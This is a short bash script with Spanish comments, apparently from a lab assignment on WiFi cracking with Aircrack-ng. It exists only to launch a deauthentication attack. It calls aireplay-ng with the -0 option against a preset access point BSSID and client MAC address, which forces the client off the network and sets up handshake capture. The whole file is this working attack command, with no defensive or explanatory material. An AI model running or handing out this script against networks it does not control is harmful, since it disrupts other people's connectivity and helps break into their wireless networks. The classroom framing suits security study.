#!/bin/bash
# Script para ejecutar ataque de deautenticación
# Práctica 08: WiFi Cracking con Aircrack-ng

# Parámetros del ataque
INTERFACE="${1:-wlp2s0mon}"
BSSID="${2:-00:21:29:B3:96:6F}"
CLIENT="${3:-6E:90:F4:45:A4:B9}"
PACKETS="${4:-9}"

sudo aireplay-ng -0 "$PACKETS" -a "$BSSID" -c "$CLIENT" "$INTERFACE"